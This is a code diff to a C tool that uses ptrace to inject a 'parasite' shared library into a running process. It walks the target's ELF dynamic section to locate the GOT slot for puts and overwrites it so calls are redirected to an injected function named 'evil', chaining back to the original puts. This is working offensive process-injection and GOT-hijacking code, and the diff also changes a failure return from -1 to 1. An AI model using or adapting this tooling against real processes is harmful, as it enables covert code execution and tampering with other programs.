@@ -318,7 +318,113 @@ resolve_symbol(const char *name, object_t *object)
 			return (symtab->st_value);
 	}
                                                                                 
-        return -1;
+        return 1;
+}
+
+
+static Elf64_Addr
+relocation_offset(pid_t pid, const char *name, Elf64_Addr address)
+{
+	int i, count;
+	Elf64_Addr base;
+	Elf64_Addr relocs;
+	Elf64_Addr symtab;
+	Elf64_Addr strtab;
+	Elf64_Xword size;
+	Elf64_Dyn *dyn;
+	Elf64_Rela *rela;
+	Elf64_Ehdr *e_hdr;
+	Elf64_Phdr *p_hdr;
+
+	base = address;
+	dyn = malloc(sizeof(Elf64_Dyn));
+	rela = malloc(sizeof(Elf64_Rela));
+	e_hdr = malloc(sizeof(Elf64_Ehdr));
+	p_hdr = malloc(sizeof(Elf64_Phdr));
+
+	ptrace_peektext(pid, base, e_hdr, sizeof(Elf64_Ehdr));
+
+	base += e_hdr->e_phoff;
+
+	do {
+		ptrace_peektext(pid, base, p_hdr, sizeof(Elf64_Phdr));
+		base += sizeof(Elf64_Phdr);
+	} while (p_hdr->p_type != PT_DYNAMIC);
+
+	base = p_hdr->p_vaddr;
+
+	do {
+		ptrace_peektext(pid, base, dyn, sizeof(Elf64_Dyn));
+
+		switch (dyn->d_tag) {
+			case DT_SYMTAB:
+				symtab = dyn->d_un.d_ptr;
+				break;
+			case DT_STRTAB:
+				strtab = dyn->d_un.d_ptr;
+				break;
+			case DT_PLTRELSZ:
+				size = dyn->d_un.d_val;
+				break;
+			case DT_JMPREL:
+				relocs = dyn->d_un.d_ptr;
+				break;
+			default:
+				break;
+		}
+
+		base += sizeof(Elf64_Dyn);
+	} while (dyn->d_tag != DT_NULL);
+
+	i = 0;
+	count = size / sizeof(Elf64_Rela);
+
+	do {
+		int index;
+		char buff[40];
+		Elf64_Sym symbol;
+		
+		ptrace_peektext(pid, relocs, rela, sizeof(Elf64_Rela));
+
+		index = ELF64_R_SYM(rela->r_info);
+		ptrace_peektext(pid, (symtab + (index * sizeof(Elf64_Sym))), 
+				&symbol, sizeof(Elf64_Sym));
+
+		ptrace_peektext(pid, strtab + symbol.st_name, buff, 
+				sizeof(buff));
+
+		if (strcmp(name, buff) == 0) {
+			return rela->r_offset;
+		}
+
+	
+		i++;
+		relocs += sizeof(Elf64_Rela);
+	} while (i < count);
+
+	return 0;
+}
+
+
+static int
+patch_function(pid_t pid, Elf64_Addr offset, Elf64_Addr address)
+{
+	int i, len;
+	uint8_t buff[80];
+	uint8_t transfer[] = "\xe8\00\x48\xb8";
+
+	ptrace_peektext(pid, offset, buff, sizeof(buff));
+
+	for (i = 0, len = sizeof(buff); i < len; i++) {
+		if (buff[i] == transfer[0] && buff[i + 1] == transfer[1] && 
+		    buff[i + 2] == transfer[2] && buff[i + 3] == transfer[3]) {
+			ptrace_poketext(pid, (offset + i) + 4, &address,
+					sizeof(Elf64_Addr));
+			return 0;
+		}
+	}
+
+	return -1;
 }
 
 
@@ -327,6 +433,9 @@ main(int argc, char **argv)
 {
 	pid_t pid;
 	long base;
+	Elf64_Addr reloc;
+	Elf64_Addr patch;
+	Elf64_Addr original;
 	object_t *parasite;
 
 	if (argc < 3) {
@@ -343,6 +452,8 @@ main(int argc, char **argv)
 
 	mapper(argv[2], parasite);
 
+	patch = resolve_symbol("evil", parasite);
+
 	pid = atoi(argv[1]);
 
 	ptrace_attach(pid);	
@@ -352,6 +463,16 @@ main(int argc, char **argv)
 		printf("Library mapping in tracee's address space failed\n");
 		exit(EXIT_FAILURE);	
 	}
+
+	patch += base;
+
+	reloc = relocation_offset(pid, "puts", 0x400000);
+	
+	ptrace_peektext(pid, reloc, &original, sizeof(Elf64_Addr));
+
+	patch_function(pid, patch, original);
+
+	ptrace_poketext(pid, reloc, &patch, sizeof(Elf64_Addr));
 
 	ptrace_detach(pid);
 
